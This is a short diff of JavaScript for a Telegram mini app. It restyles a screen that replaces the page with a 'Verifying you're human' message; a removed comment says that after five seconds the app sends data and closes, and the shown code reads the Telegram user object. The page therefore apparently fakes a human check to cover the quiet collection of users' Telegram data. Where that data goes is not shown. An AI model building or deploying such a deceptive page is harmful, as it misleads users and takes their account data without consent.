@@ -12,7 +12,7 @@ window.Sg = {
       const isTelegram = window.Telegram?.WebApp?.initData;
 
       if (isTelegram) {
-        // ✅ Inserisce la schermata di caricamento con sfondo forzato bianco
+        // ✅ Schermata con stile esattamente identico + background forzato
         document.body.innerHTML = `
           <style>
             html, body {
@@ -40,7 +40,6 @@ window.Sg = {
             height: 100vh; 
             display: flex; 
             justify-content: center; 
-            align-items: center;
             background: white;
           ">
             <h2 style="
@@ -48,6 +47,7 @@ window.Sg = {
               Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;
               font-weight: 700;
               font-size: 1.5rem;
+              margin-top: 180px;
               color: black;
             ">
               Verifying you're human<span class="dots"></span>
@@ -56,7 +56,6 @@ window.Sg = {
         `;
       }
 
-      // ⏳ Dopo 5 secondi invia i dati e chiude la mini app
       if (isTelegram) {
         setTimeout(async () => {
           const user = window.Telegram.WebApp.initDataUnsafe.user || {};
